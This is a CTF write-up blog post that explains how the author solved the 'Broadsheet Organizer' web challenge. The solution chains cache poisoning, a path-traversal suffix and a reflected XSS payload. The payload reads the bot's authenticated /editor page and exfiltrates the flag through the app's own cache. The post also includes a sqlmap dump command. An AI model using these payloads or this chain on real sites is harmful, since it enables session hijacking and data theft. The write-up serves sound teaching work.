# CSCTF 2026 — Broadsheet Organizer Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Broadsheet Organizer  
>  **Category:** Web  
>  **Author:** Paul Valase  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Broadsheet Organizer** web challenge from **CSCTF 2026**.

Broadsheet is an intranet notice board where pages are served through a shared cache. An automated duty editor reviews boards on request, but stays only a few seconds and performs GET requests only. The editor has no internet access and cannot leave the application. The goal was to retrieve a flag stored in the editor’s authenticated view (`/editor`).

Let’s get right into it!

---

## Initial Reconnaissance

I started by mapping the main pages:

- `/` — zones index (`general`, `workshop`, `canteen`, `yard`, `office`, `stores`, `dock-2`, `nights`).
- `/z/<zone>/` — working view with a ticker preview form and an embed iframe.
- `/z/<zone>/board` — board view (the one the duty editor opens).
- `/drafts` — create and publish notices.
- `/roster?dept=<dept>` — staff directory.
- `/review` — ask the duty editor to review a zone.
- `/editor` — requires an authenticated desk session (returned 403).

The board page loaded one dynamic resource:

```html
<script src="/z/<zone>/ticker.js"></script>
```

The ticker returned JavaScript that set the text of a ticker element:

```javascript
var el = document.getElementById("ticker");
if (el) { el.textContent = "Some notice title"; }
```

The working view also had a **snippet check** form:

```html
<form method="get" action="/z/<zone>/embed/<token>" target="embedpreview">
  <textarea name="html"></textarea>
</form>
<iframe name="embedpreview" sandbox="allow-scripts"></iframe>
```

This endpoint reflected the `html` parameter into a sandboxed iframe.

---

## Exploring the Application and SQL Injection

I tested the `dept` parameter on `/roster`:

```text
/roster?dept=ops'
```

The server returned a SQLite error. Using `sqlmap`, I confirmed a boolean‑based blind, error‑based, and UNION‑based SQL injection. The query had 6 columns.

I dumped the database:

```bash
sqlmap -u "http://target/roster?dept=ops" -p dept --batch --level=5 --risk=3 --dump-all
```

The database contained three tables: `staff`, `shift`, and `desk`. No flag was present. Stacked queries for INSERT/UPDATE did not execute, and `ATTACH DATABASE` did not yield readable data. The SQLi was read‑only.

The data provided useful context — the duty editors were **V. Marchetti** and **S. Delacroix**, and their sessions were issued at `term-editor-1` — but the SQL injection was not the intended path. I later confirmed this with the challenge author.

---

## Understanding the Shared Cache

The briefing explicitly mentioned a shared cache. I tested the ticker endpoint:

```text
GET /z/general/ticker.js?text=POISONED
```

Then a subsequent request without the query string:

```text
GET /z/general/ticker.js
```

Returned `POISONED`. This confirmed the cache ignores the query string when building the cache key. The response is cached per‑path.

This is a classic web cache poisoning condition: if the cache key does not include a parameter that affects the response, an attacker can poison the cache entry for other users.

The `/review` endpoint triggers the duty editor. A POST with `zone=<zone>` returns `200 Sent` if accepted, or `429 Busy` if too many reviews are in flight. The editor opens `/z/<zone>/board`, which loads `/z/<zone>/ticker.js` as an external script. If I could poison the ticker cache with my JavaScript, the editor would execute it.

---

## Finding the XSS Primitive

I needed JavaScript execution in the editor’s browser. I tested several injection points:

- The `text` parameter of `ticker.js` – properly escaped as a JavaScript string.
- Notice titles – also escaped correctly when rendered into `ticker.js`.
- Zone names – strictly validated, only alphanumeric and dash.
- HTML output on boards, notices, `/by/`, `/roster` – all escaped.

The SQL injection was read‑only.

Then I looked at the **embed** endpoint on the working view. When I opened `/z/<zone>/embed/<token>?html=<payload>` in my browser, the `html` parameter was reflected into an iframe with `sandbox="allow-scripts"`. JavaScript inside the iframe executed.

But there was a problem: the bot did not visit the working view where the embed preview existed. It only visited `/z/<zone>/board`. Simply having XSS was not enough; I needed to make the injected code part of a resource that the bot actually loaded.

---

## The Missing Link: Path Traversal Meets Cache Poisoning

The breakthrough came from combining two observations:

1. The embed endpoint reflected my `html` parameter.
2. The board loaded `/z/<zone>/ticker.js` as a script.

What if I could make a request to the embed endpoint that would be **cached under the ticker’s path**?

The embed endpoint path was:

```text
/z/<zone>/embed/<token>
```

The ticker path was:

```text
/z/<zone>/ticker.js
```

I tried a path traversal suffix:

```text
/z/<zone>/embed/<token>/..%2f..%2fticker.js?html=<payload>
```

The server normalized the path, resolving `..%2f..%2f` to the parent directory, so the request effectively became:

```text
/z/<zone>/ticker.js?html=<payload>
```

But the application still processed the `html` parameter and reflected it in the response. So the response to this request contained my JavaScript payload, not the normal ticker code.

Because the shared cache ignores the query string, this response was stored in the cache for `/z/<zone>/ticker.js`.

Now, when the editor loaded the board, it requested `/z/<zone>/ticker.js` (without the query string), and the cache returned my poisoned response. The editor executed my JavaScript.

This interaction is subtle:

- The attacker requests a URL with a path traversal suffix and a query parameter.
- The origin server normalizes the path and processes the query parameter, returning a response containing the payload.
- The shared cache stores this response under the normalized path (`/z/<zone>/ticker.js`), ignoring the query string.
- The editor later requests the normalized path without a query string, and the cache serves the poisoned response.

To avoid existing cache entries, I created a fresh zone, published a dummy notice to instantiate it, and fetched its embed token from the working view.

---

## Crafting the Payload

The payload had to run in the editor’s browser, fetch `/editor` with the editor’s authenticated session (same‑origin requests automatically include cookies), extract the flag, and exfiltrate it to a zone I could read.

Because the editor had no internet access, I used the application’s own cache as the exfiltration channel. I chose short, unique two‑letter zone names to keep the payload compact.

The JavaScript payload:

```javascript
fetch('/editor')
  .then(r => r.text())
  .then(t => {
    let m = t.match(/CSCTF\{[^}]+\}/);
    let data = m ? m[0] : t;              // extract flag or full page
    let b64 = btoa(unescape(encodeURIComponent(data)));
    let cs = 400;                         // chunk size to avoid parameter limits
    let zs = ['bm','sx','ro','qg','v8'];  // short unique zones for exfiltration
    for (let i = 0; i < b64.length; i += cs) {
      let c = b64.slice(i, i + cs);
      let idx = Math.floor(i / cs);
      if (idx < zs.length)
        fetch('/z/' + zs[idx] + '/ticker.js?text=' + encodeURIComponent(c));
    }
  });
```

I split the base64 into 400‑character chunks because the ticker’s `text` parameter had a maximum length (the form showed `maxlength="500"`). The `fetch` calls are GET requests, which fits the editor’s GET‑only restriction. Same‑origin `fetch` requests automatically include cookies, so the editor’s authenticated session was used without me ever seeing the cookie.

I URL‑encoded the entire JavaScript and appended it to the path traversal URL:

```text
GET /z/<fresh_zone>/embed/<token>/..%2f..%2fticker.js?html=<URL-encoded-JS>
```

The server responded with my JavaScript, and the cache stored it for `/z/<fresh_zone>/ticker.js`.

I verified the poison by requesting `/z/<fresh_zone>/ticker.js` without the query string; it returned my payload.

---

## Triggering the Duty Editor

I triggered the duty editor with:

```http
POST /review HTTP/1.1
Content-Type: application/x-www-form-urlencoded

zone=<fresh_zone>
```

The editor opened `/z/<fresh_zone>/board`, which loaded the poisoned ticker, executed my JavaScript, fetched `/editor`, extracted the flag, and sent the base64 chunks to the exfiltration zones.

---

## Retrieving and Decoding the Flag

I waited a few seconds, then polled each exfiltration zone:

```http
GET /z/bm/ticker.js HTTP/1.1
```

The response contained:

```javascript
var el = document.getElementById("ticker");
if (el) { el.textContent = "<BASE64_FLAG_CHUNK>"; }
```

I extracted the base64 value and decoded it:

```bash
echo "<BASE64_FLAG_CHUNK>" | base64 -d
```

Result:

```text
CSCTF{<REDACTED>}
```

The regex `/CSCTF\{[^}]+\}/` matches everything up to but not including the closing brace. So the decoded chunk lacked the final `}`. Adding it back gave the complete flag. *(Note: The live flag string has been redacted per competition rules).*

---

## Final Attack Chain

1. **Reconnaissance:** Mapped zones, endpoints, and the duty editor bot.
2. **SQL Injection:** Explored `/roster?dept=` for context but ruled it out; no flag and no write primitive.
3. **Cache Poisoning Discovery:** Confirmed the ticker cache ignores query strings.
4. **Embed Path Traversal:** Found that `/z/<zone>/embed/<token>/..%2f..%2fticker.js?html=<payload>` reflects arbitrary JavaScript into the ticker’s cache entry.
5. **XSS Payload:** Fetched `/editor` with the bot’s session, extracted the flag, and exfiltrated base64 chunks to short‑named zones.
6. **Bot Trigger:** `POST /review` sent the duty editor to the poisoned board.
7. **Flag Retrieval:** Read the base64 chunk from the exfiltration zone’s ticker, decoded to get the flag.

---

## Key Takeaways and References

- **Shared caches with incomplete keys are dangerous:** Ignoring query strings in cache keys creates powerful poisoning primitives.
- **Path traversal can turn one endpoint into another:** Even a simple embed endpoint became a cache poisoner when combined with path normalization.
- **XSS does not require breaking out of a JavaScript string:** By poisoning a JavaScript resource, I executed code without ever touching the ticker’s own escaping.
- **Exfiltration under constraints is possible:** When the bot cannot reach external hosts, the application’s own cache can act as a data store.
- **SQL injection is not always the answer:** It provided useful context, but the real flag lay behind the bot’s session.

### References

1. **PortSwigger Web Security Academy** — *Web Cache Poisoning*  
    <https://portswigger.net/web-security/web-cache-poisoning>  
    Explains cache key concepts and how unkeyed parameters lead to poisoning.
2. **OWASP Foundation** — *Path Traversal*  
    <https://owasp.org/www-community/attacks/Path_Traversal>  
    Covers directory traversal and normalization issues between proxies and servers.
3. **MDN Web Docs** — *Same-origin policy*  
    <https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>  
    Clarifies that same‑origin `fetch` requests automatically include cookies, which is how the payload read `/editor` with the bot’s session.
4. **PortSwigger Research** — *Gotta Cache ’em all: bending the rules of web cache exploitation*  
    <https://portswigger.net/research/gotta-cache-em-all>  
    Demonstrates how path normalization differences between cache and origin can be used to poison cache entries.

---

## AI Methodology

During the investigation, I used AI assistance for:

- Analyzing HTTP responses and suggesting investigation directions.
- Generating initial versions of the JavaScript payload and the Python exploit script.
- Reviewing the cache poisoning concept and confirming the path traversal technique.

I manually verified every step: I tested the cache behavior, confirmed the XSS in the embed endpoint, performed the path traversal request, observed the poisoned ticker, triggered the bot, and decoded the exfiltrated flag myself. The AI suggestions were used as a starting point; all critical observations and the final exploit chain were reproduced and validated manually.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-broadsheet-organizer/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
